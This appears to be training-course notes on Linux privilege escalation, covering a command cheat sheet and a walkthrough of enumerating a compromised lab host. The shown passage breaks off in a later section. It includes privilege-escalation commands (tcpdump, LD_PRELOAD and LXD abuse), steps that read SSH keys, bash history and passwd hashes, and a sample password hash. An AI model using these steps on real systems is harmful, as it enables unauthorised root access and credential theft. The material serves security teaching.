
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">



<h1 id="23-linux-privilege-escalation">23. Linux Privilege Escalation</h1>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>`ps aux \</td>
<td>grep root`</td>
<td>See processes running as root</td>
</tr>
<tr>
<td><code>ps au</code></td>
<td>See logged in users</td>
</tr>
<tr>
<td><code>ls /home</code></td>
<td>View user home directories</td>
</tr>
<tr>
<td><code>ls -l ~/.ssh</code></td>
<td>Check for SSH keys for current user</td>
</tr>
<tr>
<td><code>history</code></td>
<td>Check the current user&#39;s Bash history</td>
</tr>
<tr>
<td><code>sudo -l</code></td>
<td>Can the user run anything as another user?</td>
</tr>
<tr>
<td><code>ls -la /etc/cron.daily</code></td>
<td>Check for daily Cron jobs</td>
</tr>
<tr>
<td><code>lsblk</code></td>
<td>Check for unmounted file systems/drives</td>
</tr>
<tr>
<td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td>
<td>Find world-writeable directories</td>
</tr>
<tr>
<td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td>
<td>Find world-writeable files</td>
</tr>
<tr>
<td><code>uname -a</code></td>
<td>Check the Kernel versiion</td>
</tr>
<tr>
<td><code>cat /etc/lsb-release</code></td>
<td>Check the OS version</td>
</tr>
<tr>
<td><code>gcc kernel_expoit.c -o kernel_expoit</code></td>
<td>Compile an exploit written in C</td>
</tr>
<tr>
<td><code>screen -v</code></td>
<td>Check the installed version of <code>Screen</code></td>
</tr>
<tr>
<td><code>./pspy64 -pf -i 1000</code></td>
<td>View running processes with <code>pspy</code></td>
</tr>
<tr>
<td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
<td>Find binaries with the SUID bit set</td>
</tr>
<tr>
<td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
<td>Find binaries with the SETGID bit set</td>
</tr>
<tr>
<td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td>
<td>Priv esc with <code>tcpdump</code></td>
</tr>
<tr>
<td><code>echo $PATH</code></td>
<td>Check the current user&#39;s PATH variable contents</td>
</tr>
<tr>
<td><code>PATH=.:${PATH}</code></td>
<td>Add a <code>.</code> to the beginning of the current user&#39;s PATH</td>
</tr>
<tr>
<td><code>find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></td>
<td>Search for config files</td>
</tr>
<tr>
<td><code>ldd /bin/ls</code></td>
<td>View the shared objects required by a binary</td>
</tr>
<tr>
<td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td>
<td>Escalate privileges using <code>LD_PRELOAD</code></td>
</tr>
<tr>
<td>`readelf -d payroll \</td>
<td>grep PATH`</td>
<td>Check the RUNPATH of a binary</td>
</tr>
<tr>
<td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td>
<td>Compiled a shared libary</td>
</tr>
<tr>
<td><code>lxd init</code></td>
<td>Start the LXD initialization process</td>
</tr>
<tr>
<td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td>
<td>Import a local image</td>
</tr>
<tr>
<td><code>lxc init alpine r00t -c security.privileged=true</code></td>
<td>Start a privileged LXD container</td>
</tr>
<tr>
<td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td>
<td>Mount the host file system in a container</td>
</tr>
<tr>
<td><code>lxc start r00t</code></td>
<td>Start the container</td>
</tr>
<tr>
<td><code>showmount -e 10.129.2.12</code></td>
<td>Show the NFS export list</td>
</tr>
<tr>
<td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td>
<td>Mount an NFS share locally</td>
</tr>
<tr>
<td><code>tmux -S /shareds new -s debugsess</code></td>
<td>Created a shared <code>tmux</code> session socket</td>
</tr>
<tr>
<td><code>./lynis audit system</code></td>
<td>Perform a system audit with <code>Lynis</code></td>
</tr>
</tbody>
</table>
<h2 id="introduction-to-linux-privilege-escalation">Introduction to Linux Privilege Escalation</h2>
<hr>
<p>The root account on Linux systems provides full administrative level access to the operating system. During an assessment, you may gain a low-privileged shell on a Linux host and need to perform privilege escalation to the root account. Fully compromising the host would allow us to capture traffic and access sensitive files, which may be used to further access within the environment. Additionally, if the Linux machine is domain joined, we can gain the NTLM hash and begin enumerating and attacking Active Directory.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Enumeration is the key to privilege escalation. Several helper scripts (such as <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>) exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.</p>
<p><code>OS Version</code>: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.</p>
<p><code>Kernel Version</code>: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.</p>
<p><code>Running Services</code>: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core &lt; 4.2.4.</p>
<p><strong>List Current Processes</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ps aux | grep root

root        <span class="hljs-number"> 1 </span> 1.3  0.1 <span class="hljs-number"> 37656 </span><span class="hljs-number"> 5664 </span>?        Ss   23:26   0:01 /sbin/init
root        <span class="hljs-number"> 2 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S    23:26   0:00 [kthreadd]
root        <span class="hljs-number"> 3 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S    23:26   0:00 [ksoftirqd/0]
root        <span class="hljs-number"> 4 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S    23:26   0:00 [kworker/0:0]
root        <span class="hljs-number"> 5 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S&lt;   23:26   0:00 [kworker/0:0H]
root        <span class="hljs-number"> 6 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S    23:26   0:00 [kworker/u8:0]
root        <span class="hljs-number"> 7 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S    23:26   0:00 [rcu_sched]
root        <span class="hljs-number"> 8 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S    23:26   0:00 [rcu_bh]
root        <span class="hljs-number"> 9 </span> 0.0  0.0     <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 0 </span>?        S    23:26   0:00 [migration/0]

&lt;SNIP&gt;
</code></pre>
<p><code>Installed Packages and Versions</code>: Like running services, it is important to check for any out-of-date or vulnerable packages that may be easily leveraged for privilege escalation. An example is Screen, which is a common terminal multiplexer (similar to tmux). It allows you to start a session and open many windows or virtual terminals instead of opening multiple terminal sessions. Screen version 4.05.00 suffers from a privilege escalation vulnerability that can be easily leveraged to escalate privileges.</p>
<p><code>Logged in Users</code>: Knowing which other users are logged into the system and what they are doing can give greater into possible local lateral movement and privilege escalation paths.</p>
<p><strong>List Current Processes</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ps au

USER               PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root             <span class="hljs-number"> 1256 </span> 0.0  0.1 <span class="hljs-number"> 65832 </span><span class="hljs-number"> 3364 </span>tty1     Ss   23:26   0:00 /bin/login --
cliff.moore    <span class="hljs-number"> 1322 </span> 0.0  0.1 <span class="hljs-number"> 22600 </span><span class="hljs-number"> 5160 </span>tty1     S    23:26   0:00 -bash
shared            <span class="hljs-number"> 1367 </span> 0.0  0.1 <span class="hljs-number"> 22568 </span><span class="hljs-number"> 5116 </span>pts/0    Ss   23:27   0:00 -bash
root             <span class="hljs-number"> 1384 </span> 0.0  0.1 <span class="hljs-number"> 52700 </span><span class="hljs-number"> 3812 </span>tty1     S    23:29   0:00 sudo su
root             <span class="hljs-number"> 1385 </span> 0.0  0.1 <span class="hljs-number"> 52284 </span><span class="hljs-number"> 3448 </span>tty1     S    23:29   0:00 su
root             <span class="hljs-number"> 1386 </span> 0.0  0.1 <span class="hljs-number"> 21224 </span><span class="hljs-number"> 3764 </span>tty1     S+   23:29   0:00 bash
shared            <span class="hljs-number"> 1397 </span> 0.0  0.1 <span class="hljs-number"> 37364 </span><span class="hljs-number"> 3428 </span>pts/0    R+   23:30   0:00 ps au
</code></pre>
<p><code>User Home Directories</code>: Are other user&#39;s home directories accessible? User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment.</p>
<p><strong>Home Directory Contents</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls /home

backupsvc  bob<span class="hljs-selector-class">.jones</span>  cliff<span class="hljs-selector-class">.moore</span>  logger  mrb3n  shared  stacey.jenkins
</code></pre>
<p>We can check individual user directories and check to see if files such as the <code>.bash_history</code> file are readable and contain any interesting commands, look for configuration files, and check to see if we can obtain copies of a user&#39;s SSH keys.</p>
<p><strong>User&#39;s Home Directory Contents</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -la /home/stacey.jenkins/

total <span class="hljs-number">32</span>
drwxr-xr-x <span class="hljs-number">3</span> stacey<span class="hljs-selector-class">.jenkins</span> stacey<span class="hljs-selector-class">.jenkins</span> <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span> <span class="hljs-number">23</span>:<span class="hljs-number">37</span> .
drwxr-xr-x <span class="hljs-number">9</span> root           root           <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span> <span class="hljs-number">23</span>:<span class="hljs-number">33</span> ..
-rw------- <span class="hljs-number">1</span> stacey<span class="hljs-selector-class">.jenkins</span> stacey<span class="hljs-selector-class">.jenkins</span>   <span class="hljs-number">41</span> Aug <span class="hljs-number">30</span> <span class="hljs-number">23</span>:<span class="hljs-number">35</span> <span class="hljs-selector-class">.bash_history</span>
-rw-r--r-- <span class="hljs-number">1</span> stacey<span class="hljs-selector-class">.jenkins</span> stacey<span class="hljs-selector-class">.jenkins</span>  <span class="hljs-number">220</span> Sep  <span class="hljs-number">1</span>  <span class="hljs-number">2015</span> <span class="hljs-selector-class">.bash_logout</span>
-rw-r--r-- <span class="hljs-number">1</span> stacey<span class="hljs-selector-class">.jenkins</span> stacey<span class="hljs-selector-class">.jenkins</span> <span class="hljs-number">3771</span> Sep  <span class="hljs-number">1</span>  <span class="hljs-number">2015</span> <span class="hljs-selector-class">.bashrc</span>
-rw-r--r-- <span class="hljs-number">1</span> stacey<span class="hljs-selector-class">.jenkins</span> stacey<span class="hljs-selector-class">.jenkins</span>   <span class="hljs-number">97</span> Aug <span class="hljs-number">30</span> <span class="hljs-number">23</span>:<span class="hljs-number">37</span> config<span class="hljs-selector-class">.json</span>
-rw-r--r-- <span class="hljs-number">1</span> stacey<span class="hljs-selector-class">.jenkins</span> stacey<span class="hljs-selector-class">.jenkins</span>  <span class="hljs-number">655</span> May <span class="hljs-number">16</span>  <span class="hljs-number">2017</span> <span class="hljs-selector-class">.profile</span>
drwx------ <span class="hljs-number">2</span> stacey<span class="hljs-selector-class">.jenkins</span> stacey<span class="hljs-selector-class">.jenkins</span> <span class="hljs-number">4096</span> Aug <span class="hljs-number">30</span> <span class="hljs-number">23</span>:<span class="hljs-number">35</span> .ssh
</code></pre>
<p>If you find an SSH key for your current user, this could be used to open an SSH session on the host (if SSH is exposed externally) and gain a stable and fully interactive session. SSH keys could be leveraged to access other systems within the network as well. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.</p>
<p><strong>SSH Directory Contents</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -l ~/.ssh

total 8
-rw-------<span class="hljs-number"> 1 </span>mrb3n mrb3n<span class="hljs-number"> 1679 </span>Aug<span class="hljs-number"> 30 </span>23:37 id_rsa
-rw-r--r--<span class="hljs-number"> 1 </span>mrb3n mrb3n <span class="hljs-number"> 393 </span>Aug<span class="hljs-number"> 30 </span>23:37 id_rsa.pub
</code></pre>
<p>It is also important to check a user&#39;s bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.</p>
<p><strong>Bash History</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ history

    <span class="hljs-number">1</span>  id
    <span class="hljs-number">2</span>  cd /home/cliff<span class="hljs-selector-class">.moore</span>
    <span class="hljs-number">3</span>  exit
    <span class="hljs-number">4</span>  touch backup<span class="hljs-selector-class">.sh</span>
    <span class="hljs-number">5</span>  tail /var/log/apache2/error<span class="hljs-selector-class">.log</span>
    <span class="hljs-number">6</span>  ssh ec2-user@dmz02<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>
    <span class="hljs-number">7</span>  history
</code></pre>
<p><code>Sudo Privileges</code>: Can the user run any commands either as another user or as root? If you do not have credentials for the user, it may not be possible to leverage sudo permissions. However, often sudoer entries include <code>NOPASSWD</code>, meaning that the user can run the specified command without being prompted for a password. Not all commands, even we can run as root, will lead to privilege escalation. It is not uncommon to gain access as a user with full sudo privileges, meaning they can run any command as root. Issuing a simple <code>sudo su</code> command will immediately give you a root session.</p>
<p><strong>Sudo - List User&#39;s Privileges</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo -l

Matching Defaults entries <span class="hljs-keyword">for</span> sysadm on <span class="hljs-string">NIX02:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin\:/</span>usr<span class="hljs-regexp">/local/</span>bin\:<span class="hljs-regexp">/usr/</span>sbin\:<span class="hljs-regexp">/usr/</span>bin\:<span class="hljs-regexp">/sbin\:/</span>bin\:<span class="hljs-regexp">/snap/</span>bin

User sysadm may run the following commands on <span class="hljs-string">NIX02:</span>
    (root) <span class="hljs-string">NOPASSWD:</span> <span class="hljs-regexp">/usr/</span>sbin/tcpdump
</code></pre>
<p><code>Configuration Files</code>: Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as <code>.conf</code> and <code>.config</code>, for usernames, passwords, and other secrets.</p>
<p><code>Readable Shadow File</code>: If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute-force attack to recover the cleartext password.</p>
<p><code>Password Hashes in /etc/passwd</code>: Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the <code>shadow</code> file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.</p>
<p><strong>Passwd</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span>etc/passwd
<span class="hljs-symbol">
root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-string">daemon:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sys:</span><span class="hljs-string">x:</span><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-string">sys:</span><span class="hljs-regexp">/dev:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sync:</span><span class="hljs-string">x:</span><span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">sync:</span><span class="hljs-regexp">/bin:/</span>bin/sync
<span class="hljs-string">games:</span><span class="hljs-string">x:</span><span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">man:</span><span class="hljs-string">x:</span><span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-string">man:</span><span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/man:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">lp:</span><span class="hljs-string">x:</span><span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-string">lp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/lpd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mail:</span><span class="hljs-string">x:</span><span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-string">mail:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">mail:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">news:</span><span class="hljs-string">x:</span><span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-string">news:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/news:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
&lt;...SNIP...&gt;
<span class="hljs-string">dnsmasq:</span><span class="hljs-string">x:</span><span class="hljs-number">109</span>:<span class="hljs-number">65534</span>:dnsmasq,,,:<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/misc:/</span>bin/<span class="hljs-literal">false</span>
<span class="hljs-string">sshd:</span><span class="hljs-string">x:</span><span class="hljs-number">110</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/sshd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mrb3n:</span><span class="hljs-string">x:</span><span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:mrb3n,,,:<span class="hljs-regexp">/home/</span><span class="hljs-string">mrb3n:</span><span class="hljs-regexp">/bin/</span>bash
<span class="hljs-string">colord:</span><span class="hljs-string">x:</span><span class="hljs-number">111</span>:<span class="hljs-number">118</span>:colord colour management daemon,,,:<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/colord:/</span>bin/<span class="hljs-literal">false</span>
<span class="hljs-string">backupsvc:</span><span class="hljs-string">x:</span><span class="hljs-number">1001</span>:<span class="hljs-number">1001</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">backupsvc:</span>
bob.<span class="hljs-string">jones:</span><span class="hljs-string">x:</span><span class="hljs-number">1002</span>:<span class="hljs-number">1002</span>::<span class="hljs-regexp">/home/</span>bob.<span class="hljs-string">jones:</span>
cliff.<span class="hljs-string">moore:</span><span class="hljs-string">x:</span><span class="hljs-number">1003</span>:<span class="hljs-number">1003</span>::<span class="hljs-regexp">/home/</span>cliff.<span class="hljs-string">moore:</span>
<span class="hljs-string">logger:</span><span class="hljs-string">x:</span><span class="hljs-number">1004</span>:<span class="hljs-number">1004</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">logger:</span>
<span class="hljs-string">shared:</span><span class="hljs-string">x:</span><span class="hljs-number">1005</span>:<span class="hljs-number">1005</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">shared:</span>
stacey.<span class="hljs-string">jenkins:</span><span class="hljs-string">x:</span><span class="hljs-number">1006</span>:<span class="hljs-number">1006</span>::<span class="hljs-regexp">/home/</span>stacey.<span class="hljs-string">jenkins:</span>
<span class="hljs-string">sysadm:</span>$<span class="hljs-number">6</span>$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A<span class="hljs-number">.0</span><span class="hljs-string">HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:</span><span class="hljs-number">1007</span>:<span class="hljs-number">1007</span>::<span class="hljs-regexp">/home/</span><span class="hljs-string">sysadm:</span>
</code></pre>
<p><code>Cron Jobs</code>: Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.</p>
<p><strong>Cron Jobs</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -la /etc/cron.daily/

total 60
drwxr-xr-x <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 30 </span>23:49 .
drwxr-xr-x<span class="hljs-number"> 93 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 30 </span>23:47 ..
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 376 </span>Mar<span class="hljs-number"> 31 </span><span class="hljs-number"> 2016 </span>apport
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1474 </span>Sep<span class="hljs-number"> 26 </span><span class="hljs-number"> 2017 </span>apt-compat
-rwx--x--x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 379 </span>Aug<span class="hljs-number"> 30 </span>23:49 backup
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 355 </span>May<span class="hljs-number"> 22 </span><span class="hljs-number"> 2012 </span>bsdmainutils
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1597 </span>Nov<span class="hljs-number"> 27 </span><span class="hljs-number"> 2015 </span>dpkg
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 372 </span>May <span class="hljs-number"> 6 </span><span class="hljs-number"> 2015 </span>logrotate
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1293 </span>Nov <span class="hljs-number"> 6 </span><span class="hljs-number"> 2015 </span>man-db
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 539 </span>Jul<span class="hljs-number"> 16 </span><span class="hljs-number"> 2014 </span>mdadm
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 435 </span>Nov<span class="hljs-number"> 18 </span><span class="hljs-number"> 2014 </span>mlocate
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 249 </span>Nov<span class="hljs-number"> 12 </span><span class="hljs-number"> 2015 </span>passwd
-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 102 </span>Apr <span class="hljs-number"> 5 </span><span class="hljs-number"> 2016 </span>.placeholder
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3449 </span>Feb<span class="hljs-number"> 26 </span><span class="hljs-number"> 2016 </span>popularity-contest
-rwxr-xr-x <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 214 </span>May<span class="hljs-number"> 24 </span><span class="hljs-number"> 2016 </span>update-notifier-common
</code></pre>
<p><code>Unmounted File Systems and Additional Drives</code>: If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.</p>
<p><strong>File Systems &amp; Additional Drives</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0   <span class="hljs-number"> 0 </span>  30G <span class="hljs-number"> 0 </span>disk 
├─sda1   8:1   <span class="hljs-number"> 0 </span>  29G <span class="hljs-number"> 0 </span>part /
├─sda2   8:2   <span class="hljs-number"> 0 </span>   1K <span class="hljs-number"> 0 </span>part 
└─sda5   8:5   <span class="hljs-number"> 0 </span> 975M <span class="hljs-number"> 0 </span>part [SWAP]
sr0     11:0   <span class="hljs-number"> 1 </span> 848M <span class="hljs-number"> 0 </span>rom
</code></pre>
<p><code>SETUID and SETGID Permissions</code>: Binaries are set with these permissions to allow a user to run a command as root, without having to grant root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell.</p>
<p><code>Writeable Directories</code>: It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.</p>
<p><strong>Find Writable Directories</strong></p>
<p>Introduction to Linux Privilege Escalation</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span> -path <span class="hljs-regexp">/proc -prune -o -type d -perm -o+w 2&gt;/</span>dev/<span class="hljs-literal">null</span>

/dmz-backups
/tmp
<span class="hljs-regexp">/tmp/</span>VMwareDnD
<span class="hljs-regexp">/tmp/</span>.XIM-unix
<span class="hljs-regexp">/tmp/</span>.Test-unix
<span class="hljs-regexp">/tmp/</span>.X11-unix
<span class="hljs-regexp">/tmp/</span>systemd-<span class="hljs-keyword">private</span><span class="hljs-number">-8</span>a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
<span class="hljs-regexp">/tmp/</span>.font-unix
<span class="hljs-regexp">/tmp/</span>.ICE-unix
/proc
<span class="hljs-regexp">/dev/</span>mqueue
<span class="hljs-regexp">/dev/</span>shm
<span class="hljs-regexp">/var/</span>tmp
<span class="hljs-regexp">/var/</span>tmp<span class="hljs-regexp">/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/</span>tmp
<span class="hljs-regexp">/var/</span>crash
<span class="hljs-regexp">/run/</span>lock
</code></pre>
<p><code>Writeable Files</code>: Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.</p>
<p><strong>Find Writable Files</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span> -path <span class="hljs-regexp">/proc -prune -o -type f -perm -o+w 2&gt;/</span>dev/<span class="hljs-literal">null</span>

<span class="hljs-regexp">/etc/</span>cron.daily/backup
<span class="hljs-regexp">/dmz-backups/</span>backup.sh
/proc
<span class="hljs-regexp">/sys/</span>fs<span class="hljs-regexp">/cgroup/</span>memory<span class="hljs-regexp">/init.scope/</span>cgroup.event_control

&lt;SNIP&gt;

<span class="hljs-regexp">/home/</span>backupsvc/backup.sh

&lt;SNIP&gt;
</code></pre>
<hr>
<h3 id="moving-on">Moving on</h3>
<p>As we have seen, there are various manual enumeration techniques that we can perform to gain information to inform various privilege escalation attacks. A variety of techniques exist that can be leveraged to perform local privilege escalation on Linux, which we will cover in the next sections.</p>
<h2 id="environment-enumeration">Environment Enumeration</h2>
<hr>
<p>Enumeration is the key to privilege escalation. Several helper scripts (such as <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a> and <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.</p>
<p><code>OS Version</code>: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.</p>
<p><code>Kernel Version</code>: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.</p>
<p><code>Running Services</code>: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core &lt; 4.2.4.</p>
<hr>
<h3 id="gaining-situational-awareness">Gaining Situational Awareness</h3>
<p>Let&#39;s say we have just gained access to a Linux host by exploiting an unrestricted file upload vulnerability during an External Penetration Test. After establishing our reverse shell (and ideally some sort of persistence), we should start by gathering some basics about the system we are working with.</p>
